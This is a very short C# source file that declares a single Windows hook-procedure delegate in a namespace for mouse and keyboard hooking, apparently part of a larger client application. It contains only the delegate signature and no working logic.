using System;

namespace xClient.Core.MouseKeyHook.WinApi;

public delegate IntPtr HookProcedure(int nCode, IntPtr wParam, IntPtr lParam);
